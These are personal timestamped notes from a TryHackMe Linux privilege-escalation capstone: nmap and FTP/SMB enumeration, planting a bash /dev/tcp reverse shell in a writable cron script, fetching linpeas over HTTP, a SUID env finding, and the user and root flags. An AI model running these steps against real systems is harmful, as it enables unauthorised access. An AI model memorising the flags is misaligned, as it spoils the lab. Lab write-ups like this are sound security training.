```

Anonymous-Tryhackme - LINUX PRIV ESC COURSE CAPSTONE #2 - medium.
IP:10.10.237.104
```

```
3:40 PM 1/11/2023
nmap -sC -sV -oA nmap 10.10.237.104

	└─# nmap -sC -sV -oA nmap 10.10.237.104
	Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-11 20:40 EST
	Nmap scan report for 10.10.237.104
	Host is up (0.22s latency).
	Not shown: 996 closed tcp ports (reset)
	PORT    STATE SERVICE     VERSION
	21/tcp  open  ftp         vsftpd 2.0.8 or later
	| ftp-syst: 
	|   STAT: 
	| FTP server status:
	|      Connected to ::ffff:10.13.13.125
	|      Logged in as ftp
	|      TYPE: ASCII
	|      No session bandwidth limit
	|      Session timeout in seconds is 300
	|      Control connection is plain text
	|      Data connections will be plain text
	|      At session startup, client count was 1
	|      vsFTPd 3.0.3 - secure, fast, stable
	|_End of status
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
	22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
	|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
	|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
	139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
	Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

	Host script results:
	|_clock-skew: mean: 0s, deviation: 1s, median: -1s
	|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
	| smb2-time: 
	|   date: 2023-01-12T01:40:15
	|_  start_date: N/A
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	| smb2-security-mode: 
	|   3.1.1: 
	|_    Message signing enabled but not required
	| smb-os-discovery: 
	|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
	|   Computer name: anonymous
	|   NetBIOS computer name: ANONYMOUS\x00
	|   Domain name: \x00
	|   FQDN: anonymous
	|_  System time: 2023-01-12T01:40:16+00:00
```

```
3:41 PM 1/11/2023
┌──(root㉿kali)-[/home/kali]
└─# ftp 10.10.237.104
Connected to 10.10.237.104.
220 NamelessOne's FTP Server!
Name (10.10.237.104:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

```
3:59 PM 1/11/2023
┌──(root㉿kali)-[/home/kali/Documents/tryhackme/anonymous_capstone2]
└─# smbclient -L 10.10.237.104 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            ANONYMOUS
                                                                                                                     
┌──(root㉿kali)-[/home/kali/Documents/tryhackme/anonymous_capstone2]
```

```
4:01 PM 1/11/2023
┌──(root㉿kali)-[/home/kali/Documents/tryhackme/anonymous_capstone2]
└─# smbclient //10.10.237.104/pics -N
Try "help" to get a list of possible commands.
smb: \> ?
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> pwd
Current directory is \\10.10.237.104\pics\
smb: \> ls
  .                                   D        0  Sun May 17 07:11:34 2020
  ..                                  D        0  Wed May 13 21:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020

		20508240 blocks of size 1024. 13306812 blocks available
smb: \> 
```

```
4:13 PM 1/11/2023
did not work. https://www.hackingdna.com/2020/09/exploit-vsftpd-208.html
```

```
4:13 PM 1/11/2023
nmap --script ftp-vsftpd-backdoor -p 21 10.10.237.104
```

```
4:17 PM 1/11/2023
nmap --script smb-vuln* -p 139,445 10.10.237.104

	Host script results:
	|_smb-vuln-ms10-054: false
	| smb-vuln-regsvc-dos: 
	|   VULNERABLE:
	|   Service regsvc in Microsoft Windows systems vulnerable to denial of service   																							#Doesn't really help with anything.
	|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
	|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
	|       while working on smb-enum-sessions.
	|_          
	|_smb-vuln-ms10-061: false
```

```
4:27 PM 1/11/2023
went back to ftp server and pulled files.
	ftp> ls
	229 Entering Extended Passive Mode (|||15351|)
	150 Here comes the directory listing.
	drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
	226 Directory send OK.
	ftp> cd scripts
	250 Directory successfully changed.
	ftp> ls
	229 Entering Extended Passive Mode (|||36732|)
	150 Here comes the directory listing.
	-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
	-rw-rw-r--    1 1000     1000         2967 Jan 12 02:26 removed_files.log
	-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
	226 Directory send OK.
	ftp> get clean.sh
	local: clean.sh remote: clean.sh
	229 Entering Extended Passive Mode (|||30880|)
	150 Opening BINARY mode data connection for clean.sh (314 bytes).
	100% |**************************************************|   314      169.97 KiB/s    00:00 ETA
	226 Transfer complete.
	314 bytes received in 00:00 (1.45 KiB/s)
	ftp> get removed_files.log
	local: removed_files.log remote: removed_files.log
	229 Entering Extended Passive Mode (|||44379|)
	150 Opening BINARY mode data connection for removed_files.log (2967 bytes).
	100% |**************************************************|  2967        2.59 MiB/s    00:00 ETA
	226 Transfer complete.
	2967 bytes received in 00:00 (13.58 KiB/s)
	ftp> get to_do.txt
	local: to_do.txt remote: to_do.txt
	229 Entering Extended Passive Mode (|||16170|)
	150 Opening BINARY mode data connection for to_do.txt (68 bytes).
	100% |**************************************************|    68        1.40 MiB/s    00:00 ETA
	226 Transfer complete.
	68 bytes received in 00:00 (0.31 KiB/s)
	ftp> 
```

```
4:59 PM 1/11/2023
creating own reverse shell to put into clean.sh because it has execution permissions

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 # used put clean.sh clean.sh command to put reverse shell on ftp server.
```

```
5:05 PM 1/11/2023
on box.


namelessone@anonymous:~$ ls
ls
pics
user.txt
namelessone@anonymous:~$ cat user.txt
cat user.txt
90d6f992585815ff991e68748c414740
namelessone@anonymous:~$ 
```

```
#####################################TIME TO PRIV ESC##############################

5:07 PM 1/11/2023
cat /etc/crontab

	cat /etc/crontab
	# /etc/crontab: system-wide crontab
	# Unlike any other crontab you don't have to run the `crontab'
	# command to install the new version when you edit this file
	# and files in /etc/cron.d. These files also have username fields,
	# that none of the other crontabs do.

	SHELL=/bin/sh
	PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

	# m h dom mon dow user	command
	17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
	25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
	47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
	52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
anacron doesn't exist.





user.txt: 90d6f992585815ff991e68748c414740
````

```
5:18 PM 1/11/2023

grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null # grabs anything with password in name.

	namelessone@anonymous:/$ grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
	<-rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
	/boot/grub/menu.lst:29:## password ['--md5'] passwd
	/boot/grub/menu.lst:33:# e.g. password topsecret`								##############################
	/boot/grub/menu.lst:34:#      password --md5 $1$gLhU0/$aW78kHK1QfV3P2b2znUoe/ 	############################
	/boot/grub/menu.lst:35:# password topsecret
	Binary file /boot/grub/i386-pc/legacycfg.mod matches
	Binary file /boot/grub/i386-pc/normal.mod matches
	/boot/grub/i386-pc/command.lst:162:password: password
	Binary file /boot/grub/i386-pc/pbkdf2_test.mod matches
	Binary file /boot/grub/i386-pc/password.mod matches
	Binary file /boot/grub/i386-pc/password_pbkdf2.mod matches
	Binary file /boot/grub/i386-pc/zfscrypt.mod matches
	/boot/grub/i386-pc/moddep.lst:3:legacycfg: linux gcry_md5 crypto password normal
	/boot/grub/i386-pc/moddep.lst:127:password: crypto normal
	Binary file /boot/grub/i386-pc/legacy_password_test.mod matches
	/boot/grub/menu.lst~:29:## password ['--md5'] passwd
	/boot/grub/menu.lst~:33:# e.g. password topsecret
	/boot/grub/menu.lst~:34:#      password --md5 $1$gLhU0/$aW78kHK1QfV3P2b2znUoe/
	/boot/grub/menu.lst~:35:# password topsecret
	Binary file /lib/modules/4.15.0-99-generic/kernel/drivers/target/sbp/sbp_target.ko matches
	Binary file /lib/modules/4.15.0-99-generic/kernel/drivers/target/iscsi/iscsi_target_mod.ko matches
	Binary file /lib/modules/4.15.0-99-generic/kernel/drivers/staging/irda/net/irlan/irlan.ko matches
	Binary file /lib/modules/4.15.0-99-generic/kernel/drivers/staging/wilc1000/wilc1000.ko matches
	Binary file /lib/modules/4.15.0-99-generic/kernel/drivers/scsi/scsi_transport_iscsi.ko matches
	Binary file /lib/modules/4.15.0-99-generic/kernel/drivers/isdn/hardware/eicon/diva_mnt.ko matches
	Binary file /lib/modules/4.15.0-99-generic/kernel/drivers/input/mouse/elan_i2c.ko matches
	Binary file /lib/modules/4.15.0-99-generic/kernel/fs/cifs/cifs.ko matches
	Binary file /lib/x86_64-linux-gnu/security/pam_exec.so matches
	Binary file /lib/x86_64-linux-gnu/security/pam_userdb.so matches
	Binary file /lib/x86_64-linux-gnu/security/pam_stress.so matches
	Binary file /lib/x86_64-linux-gnu/security/pam_pwhistory.so matches
	Binary file /lib/x86_64-linux-gnu/security/pam_ftp.so matches
	Binary file /lib/x86_64-linux-gnu/security/pam_extrausers.so matches
	Binary file /lib/x86_64-linux-gnu/security/pam_unix.so matches
	Binary file /lib/x86_64-linux-gnu/libc-2.27.so matches
	Binary file /lib/x86_64-linux-gnu/libpam.so.0.83.1 matches
	Binary file /lib/x86_64-linux-gnu/libdbus-1.so.3.19.4 matches
	Binary file /lib/x86_64-linux-gnu/libcryptsetup.so.12.2.0 matches
	Binary file /lib/systemd/systemd-reply-password matches
	Binary file /lib/systemd/systemd-cryptsetup matches
	Binary file /lib/systemd/systemd matches
	Binary file /lib/systemd/libsystemd-shared-237.so matches
	/lib/systemd/system/systemd-ask-password-console.path:11:Description=Dispatch Password Requests to Console Directory Watch
	/lib/systemd/system/systemd-ask-password-console.path:12:Documentation=man:systemd-ask-password-console.service(8)
	/lib/systemd/system/systemd-ask-password-console.path:20:DirectoryNotEmpty=/run/systemd/ask-password
	/lib/systemd/system/plymouth-start.service:4:Wants=systemd-ask-password-plymouth.path
	/lib/systemd/system/plymouth-start.service:6:Before=systemd-ask-password-plymouth.service
	/lib/systemd/system/systemd-ask-password-plymouth.service:2:Description=Forward Password Requests to Plymouth
	/lib/systemd/system/systemd-ask-password-plymouth.service:14:ExecStart=/bin/systemd-tty-ask-password-agent --watch --plymouth
	/lib/systemd/system/systemd-ask-password-console.service:11:Description=Dispatch Password Requests to Console
	/lib/systemd/system/systemd-ask-password-console.service:12:Documentation=man:systemd-ask-password-console.service(8)
	/lib/systemd/system/systemd-ask-password-console.service:20:ExecStart=/bin/systemd-tty-ask-password-agent --watch --console
	/lib/systemd/system/systemd-ask-password-wall.service:11:Description=Forward Password Requests to Wall
	/lib/systemd/system/systemd-ask-password-wall.service:12:Documentation=man:systemd-ask-password-console.service(8)
	/lib/systemd/system/systemd-ask-password-wall.service:16:ExecStartPre=-/bin/systemctl stop systemd-ask-password-console.path systemd-ask-password-console.service sys
```

```
6:01 PM 1/11/2023
had to look up how to get linpeas on box.

#hosting on kali vm
└─$ python3 -m http.server    
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.237.104 - - [11/Jan/2023 22:43:53] "GET / HTTP/1.1" 200 -
10.10.237.104 - - [11/Jan/2023 22:59:16] "GET /linpeas.sh HTTP/1.1" 200 -


#to get linpeas on victim box.
wget http://10.13.13.125:8000/linpeas.sh
chmod +x to make executable.
```

```
6:03 PM 1/11/2023
using linpeas....

-rwsr-xr-x 1 root root 35K Jan 18  2018 /usr/bin/env
#interesting binary with suid bit set, going to try to abuse

namelessone@anonymous:
python -c 'import pty; pty.spawn("/bin/bash")'

                                 
┌──(kali㉿kali)-[~/Documents/transfer]
└─$ python3 -m http.server  


cat root.txt
4d930091c31a622a7ed10f27999af363
```

```
